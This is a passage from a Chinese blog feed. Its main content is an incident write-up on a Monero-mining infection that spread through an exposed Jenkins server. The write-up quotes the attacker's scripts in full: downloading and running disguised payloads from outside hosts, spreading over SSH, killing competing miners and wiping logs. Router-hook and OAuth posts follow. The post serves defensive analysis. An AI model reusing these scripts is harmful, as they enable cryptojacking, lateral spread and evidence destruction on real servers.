class="string">"hashfish"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"kworkerds"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"watchdog"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"/tmp/devtool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"systemctI"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"watchdogs"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"ksoftirqds"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef|grep -v grep|grep <span class="string">"suolbcc"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps aux|grep -v grep|grep -v kintegrityds|awk <span class="string">'&#123;if($3&gt;=80.0) print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">yum -y install coreutils||apt-get -y install coreutils</span><br><span class="line">apt-get install cron -y||yum install crontabs -y||apk add cron -y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">"/tmp/.lsdpid"</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARCH=$(uname -m)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"x86_64x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954043x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954043x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"i686x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">        nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="keyword">elif</span> [ ! -f <span class="string">"/proc/<span class="variable">$(cat /tmp/.lsdpid)</span>/stat"</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARCH=$(uname -m)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"x86_64x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954043x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954043x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">elif</span> [ <span class="variable">$&#123;ARCH&#125;</span>x = <span class="string">"i686x"</span> ]; <span class="keyword">then</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        (curl -fsSL http://sowcar.com/t6/677/1551954069x2890211684.jpg -o /tmp/kthrotlds||wget -q http://sowcar.com/t6/677/1551954069x2890211684.jpg -O /tmp/kthrotlds) &amp;&amp; chmod +x /tmp/kthrotlds</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">        nohup /tmp/kthrotlds &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">"\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b"</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no <span class="variable">$h</span> <span class="string">'(curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh &gt;/dev/null 2&gt;&amp;1 &amp;'</span> &amp; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/spool/mail/root</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/wtmp</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="built_in">echo</span> 0&gt;/var/<span class="built_in">log</span>/cron</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>就是下载脚本和文件,没有安装crontab就自动帮你安装,添加免密码登录等等.</p><p>那么 <a href="https://pastebin.com/" target="_blank" rel="noopener">https://pastebin.com/</a> 是什么网站?<br><img src="http://img.hi-arkin.com/2019-03-08-15520473297439.jpg" alt=""></p><p>就是一个可以匿名在线使用的代码风格化工具,肯定木马使用者不会傻到拿自己服务器作脚本下载的.<br>为什么是这个网站呢?<br>1.可以匿名,记得国内有用豆瓣网做脚本的,查不到就怪了.<br>2.可以使用Raw源代码输出;<br><img src="http://img.hi-arkin.com/2019-03-08-15520476513107.jpg" alt=""></p><p><img src="http://img.hi-arkin.com/2019-03-08-15520476685507.jpg" alt=""><br>随便一个人都可以在线写东西.<br>所有到这里,基本上是找不到任何有用的东西.</p><h2 id="找根源"><a href="#找根源" class="headerlink" title="找根源"></a>找根源</h2><p>这脚本怎么来的?难道我们root密码泄漏了么?<br>之前xshell被种后门,记忆犹新.我们也中招过.<br>但怀疑是怀疑还得有根据.<br>清空crontab后,又几分钟自动创建,完全清不掉呐.</p><ul><li>查看对外网络情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat</span><br></pre></td></tr></table></figure></li></ul><p><img src="http://img.hi-arkin.com/2019-03-08-15520478290815.jpg" alt=""><br>段错误,显示不全,这个netstat 可能查不了.<br>换个方向,使用ss命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss</span><br></pre></td></tr></table></figure></p><p><img src="http://img.hi-arkin.com/2019-03-08-15520480017257.jpg" alt=""><br>有两个明显的不熟悉的IP地址,因为我们服务IP地址少,一眼就能看出来异类的.</p><p>193.56.28.19<br>134.209.104.20</p><p><img src="http://img.hi-arkin.com/2019-03-08-15520481448805.jpg" alt=""></p><p><img src="http://img.hi-arkin.com/2019-03-08-15520481279843.jpg" alt=""></p><p>这些端口都在变化,随机的:<br>找到一个 <figure class="highlight plain"><figcaption><span>``` </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520487278687.jpg)</span><br><span class="line"></span><br><span class="line">查看一下进程.</span><br><span class="line">关键字 trace</span><br></pre></td></tr></table></figure></p><p>./trace<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">搜索一下文件</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520488808330.jpg)</span><br><span class="line"></span><br><span class="line">这不是jenkins的工作目录么.</span><br><span class="line">到这里我已经清楚来源了.</span><br><span class="line">jenkins是我布署的,我很清楚他的危害,想考侥幸混过去,等闲下来再去整理,没想到来得那么快.</span><br><span class="line"></span><br><span class="line">## Jenkins 自食其恶果</span><br><span class="line"></span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520491414252.jpg)</span><br><span class="line">登录jenkins后台,第一个任务就是这玩意,左下角任务不停的运行着.</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520492031184.jpg)</span><br><span class="line"></span><br><span class="line">我们看一下,他都执行什么脚本.</span><br><span class="line">触发器</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520492722210.jpg)</span><br><span class="line">每分钟运行一次,&quot;H&quot; 表示,hash.意思尽可能在每分钟内执行一个Job.执行完成,等下一分钟.</span><br><span class="line"></span><br><span class="line">看一下构建脚本</span><br><span class="line">![](http://img.hi-arkin.com/2019-03-08-15520495270442.jpg)</span><br><span class="line">贴一个完整的</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">#!/bin/bash</span><br><span class="line">if [[ $(whoami) != &quot;root&quot; ]]; then</span><br><span class="line">    for tr in $(ps -U $(whoami) | egrep -v &quot;java|ps|sh|egrep|grep|PID&quot; | cut -b1-6); do</span><br><span class="line">        kill -9 $tr || : ;</span><br><span class="line">    done;</span><br><span class="line">else </span><br><span class="line">    echo 128 &gt; /proc/sys/vm/nr_hugepages;</span><br><span class="line">    sysctl -w vm.nr_hugepages=128;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">threadCount=$(lscpu | grep &apos;CPU(s)&apos; | grep -v &apos;,&apos; | awk &apos;&#123;print $2&#125;&apos; | head -n 1);</span><br><span class="line">hostHash=$(hostname -f | md5sum | cut -c1-8);</span><br><span class="line">echo &quot;$&#123;hostHash&#125; - $&#123;threadCount&#125;&quot;;</span><br><span class="line"></span><br><span class="line">_curl () &#123;</span><br><span class="line">  read proto server path &lt;&lt;&lt;$(echo $&#123;1//// &#125;)</span><br><span class="line">  DOC=/$&#123;path// //&#125;</span><br><span class="line">  HOST=$&#123;server//:*&#125;</span><br><span class="line">  PORT=$&#123;server//*:&#125;</span><br><span class="line">  [[ x&quot;$&#123;HOST&#125;&quot; == x&quot;$&#123;PORT&#125;&quot; ]] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  exec 3&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$PORT</span><br><span class="line">  echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3</span><br><span class="line">  (while read line; do</span><br><span class="line">   [[ &quot;$line&quot; == $&apos;\r&apos; ]] &amp;&amp; break</span><br><span class="line">  done &amp;&amp; cat) &lt;&amp;3</span><br><span class="line">  exec 3&gt;&amp;-</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rm -rf config.json;</span><br><span class="line"></span><br><span class="line">d () &#123;</span><br><span class="line">curl -L --insecure --connect-timeout 10 --max-time 55 --fail $1 -o $2 2&gt; /dev/null || wget --no-check-certificate --timeout 55 --tries 2 $1 -O $2 2&gt; /dev/null || _curl $1 &gt; $2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test ! -s trace &amp;&amp; \</span><br><span class="line">    d http://193.56.28.19:52343/xmrig.tar.gz trace.tgz trace.tgz &amp;&amp; \</span><br><span class="line">    tar -zxvf trace.tgz &amp;&amp; \</span><br><span class="line">    mv xmrig trace &amp;&amp; \</span><br><span class="line">    rm -rf trace.tgz;</span><br><span class="line"></span><br><span class="line">test ! -x trace &amp;&amp; chmod +x trace;</span><br><span class="line"></span><br><span class="line">k() &#123;</span><br><span class="line">    ./trace \</span><br><span class="line">        -r 2 \</span><br><span class="line">        -R 2 \</span><br><span class="line">        --keepalive \</span><br><span class="line">        --no-color \</span><br><span class="line">--nicehash \</span><br><span class="line">        --donate-level 0 \</span><br><span class="line">        --cpu-priority 3 \</span><br><span class="line">        --print-time 10 \</span><br><span class="line">        --threads $&#123;threadCount:-4&#125; \</span><br><span class="line">        --url $1 \</span><br><span class="line">        --user P \</span><br><span class="line">        --pass X \</span><br><span class="line">        --keepalive</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k 193.56.28.19:8080 || k 193.56.28.19:8080</span><br></pre></td></tr></table></figure></p><p>开启代理服务这些都不是关键,关键是<br>下载<br><code>http://193.56.28.19:52343/xmrig.tar.gz</code><br>这个文件.<br>xmrig查一下就知道<br><img src="http://img.hi-arkin.com/2019-03-08-15520496854405.jpg" alt=""></p><p>这个就是比特币病毒.<br>至此就结束了,剩下就是清空病毒,修改系统,最简单的方法,利用阿里云的镜像加回滚.</p><p>关于我们jenkin问题:</p><ol><li>为了方便远程,我开启了公网访问</li><li>最关键还被搜索引擎收录了</li><li>管理员密码太简单了</li><li>为了方便运行脚本,把Jenkins的运行权限设太高</li><li>jenkin连接着所有服务器,攻破它就相当于攻破了城堡.</li></ol>]]></content>
      
      
      <categories>
          
          <category> DevOps </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> Linux </tag>
            
            <tag> Jekins </tag>
            
            <tag> xmrig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由事件</title>
      <link href="/2019/03/04/Javascript/routerlister/"/>
      <url>/2019/03/04/Javascript/routerlister/</url>
      
        <content type="html"><![CDATA[<h1 id="浏览器路由监听事件"><a href="#浏览器路由监听事件" class="headerlink" title="浏览器路由监听事件"></a>浏览器路由监听事件</h1><p>“路由”在任何http框架占有最重要的角色,可以说每个那框架都离不开路由,路由就是框架的核心.<br>如前端的框架,如前端框架Vue.js,React.js,AngularJS…<br>PHP框架,Laravel,ThinkPhp,CI…等.</p><p>我们今天说的路由,指的前端框架的路由.<br>因为对vue-router和react-router 4,以这两个路由来实现.<br>主要的路由事件钩子有:Before,Resolve,After,<br><strong>[Before 前置]</strong><br>离开或进入路由,在页面渲染前</p><p><strong>[Resolve 确认]</strong><br>路由已经进行完成,不能修改,不能结束,等待页面渲染结束.</p><p><strong>[After 后置]</strong><br>在页面渲染结束后发生.</p><h2 id="Before-前置事件"><a href="#Before-前置事件" class="headerlink" title="Before 前置事件"></a>Before 前置事件</h2><p>就是门卫,”从哪儿来到哪儿去的问题”<br>这门卫还可以给你瞎指路,引导你去.<br>一般用来做权限验证的.<br>通过有个全局”门卫”和小部门”门卫”.</p><p><strong>Vue</strong>:<br><a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E5%85%A8%E5%B1%80%E5%89%8D%E7%BD%AE%E5%AE%88%E5%8D%AB" target="_blank" rel="noopener">[参考]</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123; ... &#125;)</span><br><span class="line"></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">//to:去哪的路由信息</span></span><br><span class="line">  <span class="comment">//from: 来至哪</span></span><br><span class="line">  <span class="comment">//next : 门卫开门指路方法</span></span><br><span class="line">  <span class="comment">// 如果没运行next函数,就是门卫懒得不理你.</span></span><br><span class="line">  next();<span class="comment">// 给开门了,路自己去找吧吧</span></span><br><span class="line">  next(<span class="string">'/login'</span>);<span class="comment">// 指引你去登记处</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><strong>React</strong>:<br>由于React路由中没有全局中间件,React所有都是组件.<br>我们可以在根路由组件里面分别实现.</p><ol><li>进入事件</li><li>离开事件<br>一般在根组件里面,如<app>监听componentWillReceiveProps事件监听.<br>shouldComponentUpdate事件阻断.</app></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Route,Prompt &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 进入事件</span></span><br><span class="line">    componentDidMount()&#123;</span><br><span class="line">        <span class="keyword">let</span> to=<span class="keyword">this</span>.props.location</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">from</span>=<span class="literal">undefined</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(to,<span class="keyword">from</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//离开事件</span></span><br><span class="line">    shouldComponentUpdate(nextProps, nextState)&#123;</span><br><span class="line">        <span class="keyword">let</span> to=<span class="keyword">this</span>.props.location</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">from</span>=nextProps.location;</span><br><span class="line">        <span class="built_in">console</span>.log(to.pathname,form.pathname);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">// 开门</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">// 不开门</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>旧版本路由使用routerWillLeave监听.<br>新版本react-router v4以后.使用Prompt,由于没有v2版本,这里只例举.Prompt的用法.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;Route, Redirect,Prompt&#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">const</span> HomePage= <span class="function"><span class="params">()</span>=&gt;</span>(&lt;div&gt;home&lt;/div&gt;);</span><br><span class="line">        <span class="keyword">const</span> LoginPage= <span class="function"><span class="params">()</span>=&gt;</span>(&lt;div&gt;login&lt;/div&gt;);</span><br><span class="line">        <span class="keyword">const</span> NotFound=  <span class="function"><span class="params">()</span>=&gt;</span>(&lt;div&gt;404&lt;/div&gt;);</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        </span><br><span class="line">            &lt;div id=<span class="string">"APP"</span>&gt;</span><br><span class="line">                &lt;Prompt message=&#123;(to)=&gt;&#123;</span><br><span class="line">                  <span class="keyword">let</span> <span class="keyword">from</span>=<span class="keyword">this</span>.props.location;</span><br><span class="line">                  <span class="built_in">console</span>.log(to);</span><br><span class="line">                  </span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">// 跳转</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">// 不跳转</span></span><br><span class="line">                &#125;&#125; /&gt;</span><br><span class="line">                &lt;Route exact path=<span class="string">"/home"</span> component=&#123;HomePage&#125;/&gt;</span><br><span class="line">                &lt;Route exact path=<span class="string">"/login"</span> component=&#123;LoginPage&#125;/&gt;</span><br><span class="line">                &lt;Route render=&#123;NotFound&#125; /&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>React中的权限判断最好使用高阶组件来完成.如这样的写法</p><authrouter path="/" render="{HomePage}" redirectpath="/user/login"><h2 id="Resolve-渲染事件"><a href="#Resolve-渲染事件" class="headerlink" title="Resolve 渲染事件"></a>Resolve 渲染事件</h2><p>路由已经完成,正在准备渲染了.<br><strong>vue</strong><br>通过router.beforeResolve事件来实现.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.beforeResolve((to, from, next) =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><strong>React</strong><br>通过组件的生命周期来实现.<br>render();<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></p><p>React和Vue区在于,Vue的路由是独立的,而React是组件的;<br>vue先执行完成路由事件,再去渲染组件,顺序是子路由–&gt;根路由;<br>React是全部组件从,父级–&gt;子级;</p><h2 id="After-渲染事件"><a href="#After-渲染事件" class="headerlink" title="After 渲染事件"></a>After 渲染事件</h2><p><strong>vue</strong><br>vue可以通过,所有路由完成状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.afterEach((to, from) =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><strong>react</strong><br>没有全局钩子,只能约定通过高阶组件来统一管理路由状态.<br>很难避免直接使用componet的情况.</p></authrouter>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> History </tag>
            
            <tag> Vue Router </tag>
            
            <tag> React Router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OAuth授权原理</title>
      <link href="/2019/03/01/PHP/oauth/"/>
      <url>/2019/03/01/PHP/oauth/</url>
      
        <content type="html"><![CDATA[<h1 id="OAuth授权原理"><a href="#OAuth授权原理" class="headerlink" title="OAuth授权原理"></a>OAuth授权原理</h1><blockquote><p>OAuth第三开放平台授权</p></blockquote><p>绕口令: 第3方用户想获取第1方用户在第2方上的权限.<br>如JD的QQ,微信授权登录.<br><img src="http://img.hi-arkin.com/2019-03-01-15514352809303.jpg" alt=""></p><p>举个生活中的例子,就明白了.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明要取他爸爸王叔叔在招商银行存的500块钱.</span><br></pre></td></tr></table></figure></p><p>角色:</p><ul><li>用户 (王叔叔)</li><li>平台  (招商银行)</li><li>第三方 (小明)</li></ul><p>分解步骤:</p><ol><li><strong>小明</strong> 找 <strong>王叔叔</strong> 签 <strong>授权书</strong></li><li><strong>王叔叔</strong> 签 <strong>授权书</strong> ,并给小明 <strong>银行卡</strong></li><li><strong>小明</strong> 拿着 <strong>授权书</strong> 和 <strong>银行卡</strong> 到<strong>招商银行</strong> 取钱</li><li><strong>招商银行</strong> 先验证<strong>小明</strong>的身份</li><li><strong>招商银行</strong> 确定<strong>小明</strong>的身份没问题后,再验证 <strong>授权书</strong> 的内容无误然后再把钱给<strong>小明</strong></li></ol><p>上面就是一个简单的第三方授权,可以算上Oauth1.0;<br>支票系统,可以算上OAuth2.0</p><p>支票的样子:<br><img src="http://img.hi-arkin.com/2019-03-01-15514327630872.jpg" alt=""></p><p>支票系统不需要用户的银行卡及密码.</p><p>支票的基本内容:<br>平台: 招商银行<br>用户: 出票人账号和签名<br>第三方: 收款人<br>模式类型: 转账/现金<br>权限: 金额和用途<br>时间: 有效期,开票日期 </p><p><strong>支票</strong> 相当于 <strong>AccessToken</strong></p><p>AccessToken主要包含以下内容:</p><ul><li>授权方</li><li>代理方(第三方)</li><li>授权权限内容</li><li>有效期限</li></ul><p>支票系统肯定包含很多细节,如支票的防伪,防篡改,鉴别,有效性.<br>有记名支票,不记名支票.</p><p>Oauth2.0 交易流程如下.<br><img src="http://img.hi-arkin.com/2019-03-01-15514340414117.jpg" alt=""></p><p>解释:<br>认证服务器,如QQ开放平台,微信平方平台,微博开放平台等.<br>第三方平台,指我们开发的第三方应用,如论坛,商城等.可以使用微信微博登录.<br>用户,需要用微信等去登录第三方平台的用户.<br>权限,一般平台,授权第三方获取用户头像,昵称,手机号,也有操作,如支付,发微博,分享朋友圈等.</p><p>OAuth2.0关键点,授权码code,授权凭证AccessToken.<br>其它都是这些实现过程的中安全控制,边界控制,操作记录,性能优化,防伪方案,账号系统,权限管理等等.</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 产品 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>History三种模hash,history,memory</title>
      <link href="/2019/03/01/Javascript/router_history/"/>
      <url>/2019/03/01/Javascript/router_history/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript中History的三种模式区别"><a href="#JavaScript中History的三种模式区别" class="headerlink" title="JavaScript中History的三种模式区别"></a>JavaScript中History的三种模式区别</h1><blockquote><p>我们在前端做路由时,需要记录URL的历史.常见单页面,Vue,React应用</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> History </tag>
            
            <tag> Vue Router </tag>
            
            <tag> React Router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把故事讲好</title>
      <link href="/2019/02/25/PM/2019-02-25/"/>
      <url>/2019/02/25/PM/2019-02-25/</url>
      
        <content type="html"><![CDATA[<p>产品经理和导演(编剧)一样,需求会讲故事,把故事讲好.</p><p>&lt;&lt;故事思维&gt;&gt;</p>]]></content>
      
      
      <categories>
          
          <category> PM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 产品经理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>产品结构图,产品信息结构图,产品功能结构图</title>
      <link href="/2019/02/22/Project/mix/"/>
      <url>/2019/02/22/Project/mix/</url>
      
